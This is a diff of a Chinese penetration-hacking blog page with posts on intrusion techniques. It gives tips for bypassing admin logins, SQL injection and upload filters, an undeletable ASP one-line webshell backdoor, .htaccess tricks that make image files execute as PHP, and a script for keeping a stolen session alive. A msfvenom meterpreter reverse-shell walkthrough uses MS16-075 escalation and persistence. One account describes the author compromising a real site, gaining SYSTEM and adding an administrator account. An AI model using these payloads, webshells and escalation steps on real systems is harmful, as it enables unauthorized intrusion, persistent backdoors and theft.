+    <div class="article-content">
+        
+        <p>1.利用网站过滤不严直接绕过后台验证，在网站后面加上 admin/session.asp 或 admin/left.asp</p>
 <p>2.有的网站进后台会出现一个脚本提示框，输入：administrator 即可突破！因为admin代表以管理员身份进入的意思。</p>
-<p>3.有的网站开了3389，入侵之前先去连接3389，尝试弱口令或是爆破，再者就是按5次shift键，看看有没前人装过后门，然后再社工密码。</p></div><p class="readmore"><a href="/2018/02/28/渗透过程中总结的一些技巧/">阅读全文</a></p></div><div class="post"><h1 class="post-title"><a href="/2018/02/27/保证session不被服务器因超时注销/">即可保证session不被服务器因超时注销</a></h1><div class="post-meta">2018-02-27</div><div class="post-content"><p>拿到服务器后很容易被服务器注销，因此我们可以用javascript来写段代码<br>使用方法:<br>拿到偷到的session登陆后,再地址栏敲入下面代码,即可保证session不被服务器因超时注销.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javascript:(function sogili() &#123;</span><br><span class="line">    setInterval(function () &#123;_ = new XMLHttpRequest || new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);_.open(&quot;GET&quot;, location);_.send(null);&#125;, 60000);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure></p></div><p class="readmore"><a href="/2018/02/27/保证session不被服务器因超时注销/">阅读全文</a></p></div><div class="post"><h1 class="post-title"><a href="/2018/02/27/htaccess配合apache 提权/">htaccess配合apach提权</a></h1><div class="post-meta">2018-02-27</div><div class="post-content"><p>经常会有人批量拿shell。特别是upload shell这样的漏洞。</p>
+<p>3.有的网站开了3389，入侵之前先去连接3389，尝试弱口令或是爆破，再者就是按5次shift键，看看有没前人装过后门，然后再社工密码。</p>
+<p>4.有时候进后台会弹出提示框“请登陆”，把地址抄写出来（复制不了），然后放在网页源代码分析器里，选择浏览器-拦截跳转勾选–查看即可进入后台！</p>
+<p>5.突破防盗链访问webshell，代码：javascript:document.write(“<a href="http://www.xxx.com/uploadfile/1.asp" target="_blank" rel="noopener">fuck</a>“)  回车后点击GO即可进入webshell</p>
+<p>6.突破一流信息监控拦截系统访问，当小马可以访问，上传大马却不行的时候，可以先用大马跟一张图片合并，在上传合并后的图片，接着数据库备份后访问即可！</p>
+<p>7.在拿编辑器的shell时，有时增加了asp|asa|cer|php|aspx等扩展名上传时都被过滤了，其实只要增加aaspsp 上传asp就会突破了。</p>
+<p>8.有时啊D猜出表段了，但是猜不到字段的时候，可以到后台查看源文件，搜索ID或type，一般都能找到，再到啊D里添加字段进行猜解内容即可突破。</p>
+<p>9.社工后台密码可以用这个技巧，假如网站域名是：<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> 管理员名称为admin，可以试试密码“baidu”和“baidu.com”来登陆。</p>
+<p>10.手工注入时如果网站过滤了 and 1=1   and 1=2 ，可以用xor 1=1   xor 1=2 进行判断。</p>
+<p>11.本地构造上传一句话木马，如果提示“请先选择你要上传的文件！[ 重新上传 ]” ，说明文件太小了，用记事本打开再复制多几句话从而扩大文件大小，再上传即可。</p>
+<p>12.用啊d跑表，跑字段名name和pass出不来，显示长度超过50什么的，猜解不出的情况下，这时放在穿山甲去跑一般都能跑出来！</p>
+<p>13.猜管理员后台小技巧，admin/left.asp、admin/main.asp、admin/top.asp、admin/admin.asp 会现出菜单导航，然后迅雷下载全部链接。</p>
+<p>14.知道表名，字段，使用SQL语句在ACCESS数据库中加个用户名及密码语句：Insert into admin(user,pwd) values(‘test’,’test’)</p>
+<p>15.当获得管理员密码，却拿不到管理员的帐号时，到前台随便打开一个新闻，找找诸如“提交者”“发布者”之类的字眼，一般“提交者”就是管理员的帐号了。</p>
+<p>16.爆破ASP+IIS架设的网站web绝对路径，假设网站主页为：<a href="http://www.xxxxx/index.asp/" target="_blank" rel="noopener">http://www.xxxxx/index.asp/</a> 提交<a href="http://www.xxxxx.cn/fkbhvv.aspx/，fkbhvv.aspx是不存在的。" target="_blank" rel="noopener">http://www.xxxxx.cn/fkbhvv.aspx/，fkbhvv.aspx是不存在的。</a></p>
+<p>17.源码的利用，很多网站用的都是网上下载的源码，有的站长很懒，什么也不改，然后就上传开通网站了，我们可以去下载一套，里面有很多默认的信息值得利用。</p>
+<p>18.把以下代码上传到webshell里，后缀是asp，就算别人发现了也删除不了，算是超级防删的一句话木马了，可以很安全的留个后门，菜刀连接密码：x<br>&lt;%Eval(Request(chr(120))):Set fso=CreateObject(“Scripting.FileSystemObject”):Set f=fso.GetFile(Request.ServerVariables(“PATH_TRANSLATED”)):if  f.attributes &lt;&gt; 39 then:f.attributes = 39:end if%&gt;</p>
+<p>19.当破解出帐号密码却找不到后台的时候，可以尝试链接ftp，假如域名是：<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> “ 得到的密码为“bishi”，我们就可以试下用“xxxx”“xxxx.cn”<a href="http://www.xxxx.cn作为FTP" target="_blank" rel="noopener">www.xxxx.cn作为FTP</a> 用户名，用“bishi”：作为FTP密码来进行登陆，成功的几率可以很大的哦！ftp的默认端口：21  默认帐号密码：test</p>
+<p>20.有的后台不显示验证码，难道就没法登录了么? 其实把一段代码导入注册表里就可以突破这个困境了，把下面的代码保存为Code.reg，双击导入就可以了！<br>REGEDIT4<br>[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Security]<br>“BlockXBM”=dword:00000000</p>
+<p>21.当网站不允许上传 asp、asa、php等文件时，我们可以上传一个stm文件，代码为“<!--#include file=”conn.asp”-->”<br>  (想查看什么文件就写什么文件名，这里我假设想查看“conn.asp”)，然后直接打开这个stm文件的地址，再查看源代码，“conn.asp”这个文件的代码就一览无遗了！</p>
+<p>22.当网站不允许上传ASP,CGI,CER,CDX,HTR等类型的文件时，尝试上传一个shtm文件，内容为：<!--#includ file="conn.asp"--><br>如果上传成功，那太好了，访问地址就可以浏览conn.asp里的内容了，这样一来，数据库路径也就到手啦！</p>
+<p>23.手工检测注入点弹出“你的操作已被记录!”之类的信息，访问这个文件：sqlin.asp，如果存在，在注入点后面植入一句话木马：‘excute(request(“TNT”))<br>接着用一句话木马客户端连接：<a href="http://www.xxx.com/sqlin.asp，上传木马即可拿下shell，因为很多防注入程序都是用”sqlin.asp“这个文件名来做非法记录的数据库。" target="_blank" rel="noopener">http://www.xxx.com/sqlin.asp，上传木马即可拿下shell，因为很多防注入程序都是用”sqlin.asp“这个文件名来做非法记录的数据库。</a></p>
+<p>24.旁注的话，肯定是挑支持aspx的站点来日了，问题是怎样判断呢？方法很简单，在在网站后面加上xxx.aspx，如果返回“/”应用程序中的服务器错误，无法找到该资源，404画面就说明支持aspx木马。</p>
+<p>25.网站后面加test.php 可以查看版本</p>
+<p>26.禁忌这两个网站后台文件 admin_index.asp  manage_login.asp<br>总结：当然啦，这些还不太全，慢慢补上</p>
+
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/其他/">其他</a>
+</div>
+
+
+</div>
+
+
+
+
+<div class="comments-count">
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand post" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2018/02/27/htaccess配合apache 提权/" title="htaccess配合apach提权" itemprop="url">htaccess配合apach提权</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
+		
+  <p class="article-time">
+    <time datetime="2018-02-27T08:42:19.000Z" itemprop="datePublished"> 发表于 2018-02-27</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <p>经常会有人批量拿shell。特别是upload shell这样的漏洞。</p>
 <p>拿下之后最简单的修补方法是，上传一个.</p>
 <p>.HTACCESS文件到该木马，先把你的马儿转移到别的目标。</p>
-<p>.HTACCESS内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;\.(php|php3|php4|php5|php6|php2)&quot;&gt;</span><br><span class="line">Deny from all</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure></p></div><p class="readmore"><a href="/2018/02/27/htaccess配合apache 提权/">阅读全文</a></p></div><div class="post"><h1 class="post-title"><a href="/2018/01/15/MS16-075提权/">MS16-075提权</a></h1><div class="post-meta">2018-01-15</div><div class="post-content"><blockquote>
+<p>.HTACCESS内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;\.(php|php3|php4|php5|php6|php2)&quot;&gt;</span><br><span class="line">Deny from all</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure></p>
+<p>当然这是不完善的，经过我测试，Php即可轻松绕过，可以自行添加</p>
+<p>那么别人传的马儿自然无法执行了。</p>
+<p>逆向思维一下，当我们拿到一个后台权限，上传PHPshell，可恨的是，他会自动把PHP这个关键词改成PHP-，</p>
+<p>加一个横杠，有木有，特别是韩国站比较多见。</p>
+<p>如果你运气不是那么背，环境是apache的，并且支持.HTACCESS，那么，恭喜你</p>
+<p>上传一个.HTACCESS，内容是</p>
+<p>AddType   application/x-httpd-php     .jpg<br>然后再传一个JPG结尾的shell，访问即可执行了</p>
+<p>刚刚用到，顺手发上来了.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;Files demo.jpg&gt;</span><br><span class="line">ForceType application/x-httpd-php</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/Files&gt;</span><br></pre></td></tr></table></figure>
+<p>这种只有是指定文件名的文件，才能被当做PHP解析.</p>
+
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/提权免杀/">提权免杀</a>►<a class="article-category-link" href="/categories/提权免杀/windows提权/">windows提权</a>
+</div>
+
+
+</div>
+
+
+
+
+<div class="comments-count">
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand post" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2018/02/27/保证session不被服务器因超时注销/" title="即可保证session不被服务器因超时注销" itemprop="url">即可保证session不被服务器因超时注销</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
+		
+  <p class="article-time">
+    <time datetime="2018-02-27T08:42:19.000Z" itemprop="datePublished"> 发表于 2018-02-27</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <p>拿到服务器后很容易被服务器注销，因此我们可以用javascript来写段代码<br>使用方法:<br>拿到偷到的session登陆后,再地址栏敲入下面代码,即可保证session不被服务器因超时注销.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javascript:(function sogili() &#123;</span><br><span class="line">    setInterval(function () &#123;_ = new XMLHttpRequest || new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);_.open(&quot;GET&quot;, location);_.send(null);&#125;, 60000);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure></p>
+
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/XSS/">XSS</a>
+</div>
+
+
+</div>
+
+
+
+
+<div class="comments-count">
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand post" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2018/01/15/MS16-075提权/" title="MS16-075提权" itemprop="url">MS16-075提权</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
+		
+  <p class="article-time">
+    <time datetime="2018-01-15T10:37:51.000Z" itemprop="datePublished"> 发表于 2018-01-15</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <blockquote>
 <p>目标IP:192.168.163.134<br>接收反弹的IP：192.168.163.129  //注意：必须是外网IP<br>本机IP：192.168.163.120</p>
 </blockquote>
-<h3 id="1，在本机MSF框架执行："><a href="#1，在本机MSF框架执行：" class="headerlink" title="1，在本机MSF框架执行："></a>1，在本机MSF框架执行：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.163.134  LPORT=3306 -f exe -o 3306.exe</span><br></pre></td></tr></table></figure></div><p class="readmore"><a href="/2018/01/15/MS16-075提权/">阅读全文</a></p></div><div class="post"><h1 class="post-title"><a href="/2018/01/15/windows提权信息收集/">windows提权信息收集</a></h1><div class="post-meta">2018-01-15</div><div class="post-content"><h3 id="1-收集OS名称和版本信息"><a href="#1-收集OS名称和版本信息" class="headerlink" title="1. 收集OS名称和版本信息"></a>1. 收集OS名称和版本信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systeminfo | findstr /B /C:<span class="string">"OS Name"</span> /C:<span class="string">"OS Version"</span> </span><br><span class="line">systeminfo | findstr /B /C:<span class="string">"OS 名称"</span> /C:<span class="string">"OS 版本"</span></span><br></pre></td></tr></table></figure></div><p class="readmore"><a href="/2018/01/15/windows提权信息收集/">阅读全文</a></p></div><nav class="page-navigator"><span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/">下一页</a></nav></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank"><input type="text" name="q" maxlength="20" placeholder="Search"/><input type="hidden" name="sitesearch" value="http://yoursite.com"/></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/herly/">herly</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/">linux</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/windows/">windows</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/提权/">提权</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透/">渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/编程/">编程</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/XSS/" style="font-size: 15px;">XSS</a> <a href="/tags/其他/" style="font-size: 15px;">其他</a> <a href="/tags/javascript/" style="font-size: 15px;">javascript</a> <a href="/tags/windows提权/" style="font-size: 15px;">windows提权</a> <a href="/tags/parrot/" style="font-size: 15px;">parrot</a> <a href="/tags/注入/" style="font-size: 15px;">注入</a> <a href="/tags/工具/" style="font-size: 15px;">工具</a> <a href="/tags/windows/" style="font-size: 15px;">windows</a> <a href="/tags/资源/" style="font-size: 15px;">资源</a> <a href="/tags/其它/" style="font-size: 15px;">其它</a> <a href="/tags/Windows2003/" style="font-size: 15px;">Windows2003</a> <a href="/tags/rad-linux/" style="font-size: 15px;">rad linux</a> <a href="/tags/CMS/" style="font-size: 15px;">CMS</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/05/05/关于本博客/">关于本博客</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/27/hello-world/">Hello World</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/20/vim常用命令总结/">vim常用命令总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/28/PHP手工注入笔记 /">PHP手工注入笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/27/mysql手工注入之load_file()应用/">mysql手工注入之load_file()应用</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/28/渗透过程中总结的一些技巧/">PHP手工注入笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/27/保证session不被服务器因超时注销/">即可保证session不被服务器因超时注销</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/27/htaccess配合apache 提权/">htaccess配合apach提权</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/15/MS16-075提权/">MS16-075提权</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/15/windows提权信息收集/">windows提权信息收集</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div><ul></ul><a href="http://www.example1.com/" title="site-name1" target="_blank">site-name1</a><ul></ul><a href="http://www.example2.com/" title="site-name2" target="_blank">site-name2</a><ul></ul><a href="http://www.example3.com/" title="site-name3" target="_blank">site-name3</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2018 <a href="/." rel="nofollow">Bug'小虫.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>
+<h3 id="1，在本机MSF框架执行："><a href="#1，在本机MSF框架执行：" class="headerlink" title="1，在本机MSF框架执行："></a>1，在本机MSF框架执行：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.163.134  LPORT=3306 -f exe -o 3306.exe</span><br></pre></td></tr></table></figure>
+<p><img src="http://opgnaclz6.bkt.clouddn.com/6.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<p>其中windows/meterpreter/reverse_tcp反弹端口类型，lhost是反弹连接的服务器Ip地址，注意该ip地址必须是独立服务器，或者必须是外网端口映射，换句话说，就是反弹必须能够接收，lport为反弹的端口，3306为生成的程序.</p>
+<h3 id="2，在监听服务器上执行监听命令"><a href="#2，在监听服务器上执行监听命令" class="headerlink" title="2，在监听服务器上执行监听命令"></a>2，在监听服务器上执行监听命令</h3><p>（1）启动msf<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Msfconsole</span><br></pre></td></tr></table></figure></p>
+<p> <img src="http://opgnaclz6.bkt.clouddn.com/7.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<p> （2）配置meterpreter参数<br> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; use exploit/multi/handler</span><br><span class="line">meterpreter &gt; <span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">meterpreter &gt; <span class="built_in">set</span> LHOST 192.233.23.23</span><br><span class="line">meterpreter &gt; <span class="built_in">set</span> LPORT 4433</span><br><span class="line">Exploit</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://opgnaclz6.bkt.clouddn.com/8.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<p>注：（如果反弹回来不是目标，则background再exploit）</p>
+<h3 id="3，上传3306-exe程序到目标服务器及执行"><a href="#3，上传3306-exe程序到目标服务器及执行" class="headerlink" title="3，上传3306.exe程序到目标服务器及执行"></a>3，上传3306.exe程序到目标服务器及执行</h3><p><img src="http://opgnaclz6.bkt.clouddn.com/9.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<h3 id="4上传ms16-075文件"><a href="#4上传ms16-075文件" class="headerlink" title="4上传ms16-075文件"></a>4上传ms16-075文件</h3><p>通过webshll上传potato.exe文件，或者在msf下面执行命令上传：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; upload /root/potato.exe C:\\inetpub\\wwwroot\\dede</span><br></pre></td></tr></table></figure></p>
+<p>查看当前目录</p>
+<p><img src="http://opgnaclz6.bkt.clouddn.com/10.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<p>如图：已经再当前目录就不需要跳转目录了，如果不是则<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> C:\\inetpub\\wwwroot\\dede</span><br><span class="line">meterpreter &gt; use incognito</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://opgnaclz6.bkt.clouddn.com/11.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<p>如图已经返回SYSTEM了<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; list_tokens -u</span><br><span class="line">NT AUTHORITY\IUSR</span><br><span class="line">meterpreter &gt; execute -cH -f ./potato.exe</span><br><span class="line">meterpreter &gt; list_tokens -u</span><br><span class="line">NT AUTHORITY\IUSR</span><br><span class="line">NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; impersonate_token “NT AUTHORITY\\SYSTEM”</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://opgnaclz6.bkt.clouddn.com/12.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"><br>如图，第一次我执行NT AUTHORITY\SYSTEM失败了，因为少了一个/<br>meterpreter &gt; getuid<br>Server username: NT AUTHORITY\SYSTEM<br>得到SYSTEM后你可以进shell添加管理员账户密码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure></p>
+<p>或者留下后门<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run?persistence?-X?-i?10?-p?6666?-r?192.168.163.129</span><br></pre></td></tr></table></figure></p>
+
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/提权免杀/">提权免杀</a>►<a class="article-category-link" href="/categories/提权免杀/windows提权/">windows提权</a>
+</div>
+
+
+</div>
+
+
+
+
+<div class="comments-count">
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand post" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2018/01/15/MS16-032提权/" title="MS16-032提权" itemprop="url">MS16-032提权</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
+		
+  <p class="article-time">
+    <time datetime="2018-01-15T10:37:51.000Z" itemprop="datePublished"> 发表于 2018-01-15</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <p>这是一个黄网的站，所以我就不打码了。如果要看我是如何GetShell的可以在我博客上看另一篇“iis7.5解析GetShell”。废话不多说了，我们开始吧！<br>PS：操作很白痴，大牛勿喷——Bug’小虫</p>
+<h3 id="1-刚开始用的php一句话，发现执行不了命令"><a href="#1-刚开始用的php一句话，发现执行不了命令" class="headerlink" title="1,刚开始用的php一句话，发现执行不了命令"></a>1,刚开始用的php一句话，发现执行不了命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span></span><br></pre></td></tr></table></figure>
+<p><img src="http://opgnaclz6.bkt.clouddn.com/13.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<h3 id="2-上asp一句话，成功执行"><a href="#2-上asp一句话，成功执行" class="headerlink" title="2,上asp一句话，成功执行"></a>2,上asp一句话，成功执行</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span></span><br></pre></td></tr></table></figure>
+<p><img src="http://opgnaclz6.bkt.clouddn.com/14.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<h3 id="3-systeminfo一下，发现只打了一个补丁，而且是windows2012的服务器。因此习惯性的反弹一个shll到metasploit然后用ms16-075提，但是执行了多次都反弹不回来"><a href="#3-systeminfo一下，发现只打了一个补丁，而且是windows2012的服务器。因此习惯性的反弹一个shll到metasploit然后用ms16-075提，但是执行了多次都反弹不回来" class="headerlink" title="3,systeminfo一下，发现只打了一个补丁，而且是windows2012的服务器。因此习惯性的反弹一个shll到metasploit然后用ms16-075提，但是执行了多次都反弹不回来"></a>3,systeminfo一下，发现只打了一个补丁，而且是windows2012的服务器。因此习惯性的反弹一个shll到metasploit然后用ms16-075提，但是执行了多次都反弹不回来</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8080.tmp</span><br></pre></td></tr></table></figure>
+<p><img src="http://opgnaclz6.bkt.clouddn.com/15.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<h3 id="4-上传一个ms16-032，whoami一下，成功返回SYSTEM于是直接添加账户"><a href="#4-上传一个ms16-032，whoami一下，成功返回SYSTEM于是直接添加账户" class="headerlink" title="4,上传一个ms16-032，whoami一下，成功返回SYSTEM于是直接添加账户"></a>4,上传一个ms16-032，whoami一下，成功返回SYSTEM于是直接添加账户</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">32.log <span class="string">"net user caibao Heimao123!@# /add"</span>//我把ms16-032改名为32.log了</span><br></pre></td></tr></table></figure>
+<p><img src="http://opgnaclz6.bkt.clouddn.com/15.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<h3 id="5-用户添加成功"><a href="#5-用户添加成功" class="headerlink" title="5,用户添加成功"></a>5,用户添加成功</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure>
+<p><img src="http://opgnaclz6.bkt.clouddn.com/16.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<h3 id="6-提到管理员用户组"><a href="#6-提到管理员用户组" class="headerlink" title="6,提到管理员用户组"></a>6,提到管理员用户组</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">32.log <span class="string">"net localgroup administrators caibao /add"</span></span><br></pre></td></tr></table></figure>
